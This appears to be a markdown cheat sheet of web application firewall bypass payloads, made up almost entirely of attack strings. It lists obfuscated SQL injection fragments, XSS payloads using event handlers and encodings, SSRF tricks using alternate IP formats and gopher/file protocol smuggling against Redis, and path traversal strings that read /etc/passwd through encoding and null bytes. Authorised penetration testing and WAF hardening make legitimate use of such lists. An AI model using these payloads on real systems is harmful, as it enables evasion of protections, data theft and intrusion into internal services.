# WAF Bypass Techniques - Verified

## SQLi WAF Bypass

### Case Variation
```
UnIoN sElEcT
UNION/**/SELECT
UNION%0ASELECT
```

### Inline Comments
```
UN/**/ION SE/**/LECT
UNI/**/ON SEL/**/ECT
```

### URL Encoding
```
%55%4E%49%4F%4E%20%53%45%4C%45%43%54
```

### Double Encoding
```
%2555%254E%2549%254F%254E%20%2553%2545%254C%2545%2543%2554
```

### MySQL Specific
```sql
/*!UNION*//*!SELECT*/
UNION/*!50000SELECT*/
UNION ALL SELECT
```

### PostgreSQL Specific
```sql
UNION ALL SELECT
;SELECT
```

### MSSQL Specific
```sql
UNION%0ASELECT
UNION%0D%0ASELECT
```

## XSS WAF Bypass

### Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x onerror=alert(1)>
```

### Encoding
```html
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
<script>alert(1)</script>
<img src=x onerror=&#97;lert(1)>
```

### Event Handler Alternatives
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

### Without Parentheses
```html
<img src=x onerror=alert`1`>
<svg onload=alert`1`>
```

### Without Quotes
```html
<img src=x onerror=alert(1)>
```

## SSRF WAF Bypass

### IP Format Bypass
```
http://127.1
http://0x7f000001
http://0177.0.0.1
http://2130706433
http://[::1]
http://0.0.0.0
```

### URL Encoding
```
http://127.0.0.1/%2561dmin    # Double encode 'a'
http://127.0.0.1/%61dmin      # Encode 'a'
```

### DNS Rebinding
```
# Domain that resolves to different IPs at different times
# First resolution: attacker's IP (passes validation)
# Second resolution: internal IP (hits target)
```

### Protocol Smuggling
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a...
file:///etc/passwd
dict://127.0.0.1:6379/info
```

## Path Traversal WAF Bypass

### Non-Recursive Strip
```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
```

### URL Encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f
```

### Unicode Encoding
```
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
```

### Null Byte
```
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
```
